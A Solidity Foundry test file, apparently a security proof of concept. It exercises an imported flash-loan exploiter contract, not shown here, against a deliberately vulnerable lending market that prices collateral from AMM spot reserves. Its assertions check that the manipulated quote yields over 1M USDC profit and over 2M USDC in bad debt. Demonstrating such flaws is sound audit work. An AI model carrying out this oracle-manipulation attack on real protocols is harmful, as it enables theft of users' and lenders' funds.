// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "../src/interfaces/IERC20.sol";
import {FlashPumpExploiter} from "../src/OracleAttackReceiver.sol";
import {VulnerableForkFixture} from "./BaseFork.t.sol";

/// @title Mainnet-fork proof of concept: flash-loan-assisted AMM spot oracle manipulation
/// @notice Demonstrates how relying on instantaneous AMM reserves for collateral valuation
///         allows an attacker with temporary flash liquidity to inflate WETH's price ~4x,
///         borrow ~3.19M USDC against ~500 WETH (whose true borrowing power is 800k USDC),
///         extract >1.18M USDC in profit, and leave the protocol with >2.19M USDC in bad debt.
contract SpotOracleExploitProofTest is VulnerableForkFixture {
    uint256 internal constant FLASH_PRINCIPAL = 2_000_000e6;
    uint256 internal constant REFERENCE_COLLATERAL = 500e18;
    uint256 internal constant UNMANIPULATED_MAX_CREDIT = 800_000e6;

    FlashPumpExploiter internal exploiter;

    function setUp() public override {
        super.setUp();
        exploiter = _createExploiter();
        vm.label(address(exploiter), "flash-pump-exploiter");

        _supplyWeth(borrowerAlice, REFERENCE_COLLATERAL);
    }

    function test_flashLoanSpotOracleManipulation() public {
        uint256 initialQuote = spotFeed.readPrice();
        uint256 initialMarketCash = IERC20(MAINNET_USDC).balanceOf(address(creditMarket));
        uint256 legitimateCreditLimit = creditMarket.availableCredit(borrowerAlice);

        console2.log("1. pre-attack spot quote", initialQuote);
        console2.log("2. legitimate credit limit for 500 WETH", legitimateCreditLimit);
        console2.log("3. flash loan principal", FLASH_PRINCIPAL);

        assertLt(legitimateCreditLimit, FLASH_PRINCIPAL, "flash principal must exceed fair borrowing capacity");
        assertEq(initialQuote, 2_000e18, "unexpected initial quote");
        assertEq(legitimateCreditLimit, UNMANIPULATED_MAX_CREDIT, "unexpected baseline credit");

        exploiter.executeExploit(FLASH_PRINCIPAL);

        uint256 distortedQuote = spotFeed.readPrice();
        uint256 extractedDebt = exploiter.drawnAgainstCollateral();
        uint256 netAttackerGain = IERC20(MAINNET_USDC).balanceOf(exploiterOwner);

        console2.log("4. distorted spot quote after swap", distortedQuote);
        console2.log("5. USDC borrowed at distorted quote", extractedDebt);
        console2.log("6. net attacker gain after flash fee", netAttackerGain);

        assertApproxEqRel(exploiter.postedCollateral(), REFERENCE_COLLATERAL, 0.002e18, "unexpected collateral posted");
        assertApproxEqRel(distortedQuote, 8_000e18, 0.002e18, "spot quote did not jump ~4x");
        assertApproxEqRel(extractedDebt, 3_200_000e6, 0.01e18, "borrowed amount should be ~80% of pumped value");
        assertGt(extractedDebt, legitimateCreditLimit, "failed to exceed fair credit limit");
        assertEq(extractedDebt, creditMarket.borrowedDebt(address(exploiter)), "debt ledger mismatch");
        assertGt(netAttackerGain, 1_000_000e6, "exploit must yield >1M USDC net profit");

        // Arbitrage trade brings the AMM reserve ratio back to equilibrium (~2,000 USDC/WETH).
        uint256 arbitrageWeth = 500e18;
        deal(MAINNET_WETH, arbitrageBot, arbitrageWeth);
        vm.startPrank(arbitrageBot);
        IERC20(MAINNET_WETH).approve(address(ammPool), arbitrageWeth);
        ammPool.swapExactIn(arbitrageWeth, 0, MAINNET_WETH, arbitrageBot);
        vm.stopPrank();

        uint256 equilibriumQuote = spotFeed.readPrice();
        uint256 trueCollateralWorth = creditMarket.evaluateCollateral(address(exploiter));
        uint256 remainingLiability = creditMarket.borrowedDebt(address(exploiter));
        uint256 remainingMarketCash = IERC20(MAINNET_USDC).balanceOf(address(creditMarket));
        uint256 postArbitrageHealth = creditMarket.positionHealth(address(exploiter));
        uint256 uncoveredBadDebt =
            remainingLiability > trueCollateralWorth ? remainingLiability - trueCollateralWorth : 0;

        console2.log("7. post-arbitrage equilibrium quote", equilibriumQuote);
        console2.log("8. true collateral valuation after restore", trueCollateralWorth);
        console2.log("9. borrower liability on books", remainingLiability);
        console2.log("10. uncovered protocol bad debt", uncoveredBadDebt);
        console2.log("11. position health factor (1e18 = 1.0)", postArbitrageHealth);
        console2.log("12. remaining market USDC liquidity", remainingMarketCash);

        assertApproxEqRel(equilibriumQuote, 2_000e18, 0.01e18, "spot quote failed to revert to equilibrium");
        assertApproxEqAbs(trueCollateralWorth, 1_000_000e6, 10_000e6, "unexpected post-restore collateral value");
        assertGt(remainingLiability, trueCollateralWorth, "liability must exceed true collateral worth");
        assertLt(postArbitrageHealth, 1e18, "position must be underwater after price restoration");
        assertGt(uncoveredBadDebt, 2_000_000e6, "protocol bad debt must exceed 2M USDC");
        assertLt(remainingMarketCash, remainingLiability, "remaining cash cannot cover outstanding debt");
        assertEq(initialMarketCash - remainingMarketCash, extractedDebt, "cash outflow mismatch");

        // Effective LTV against restored valuation is >318% (nearly 4x the 80% maximum).
        assertGt((remainingLiability * 1e18) / trueCollateralWorth, 3.18e18, "effective LTV should exceed 318%");
    }

    /// @notice Smaller flash loan still distorts the spot reserve ratio and over-borrows beyond fair LTV.
    function test_smallFlashLoanStillOverBorrows() public {
        FlashPumpExploiter modestExploiter = _createExploiter();
        _seedStableBuffer(address(modestExploiter), 100_000e6);

        modestExploiter.executeExploit(250_000e6);

        uint256 skewedQuote = spotFeed.readPrice();
        uint256 drawnUsdc = modestExploiter.drawnAgainstCollateral();

        console2.log("modest-loan skewed quote", skewedQuote);
        console2.log("modest-loan USDC drawn", drawnUsdc);

        assertGt(skewedQuote, 2_100e18, "spot quote must increase");
        assertGt(drawnUsdc, 200_000e6, "drawn debt must exceed fair 80% LTV");
    }
}
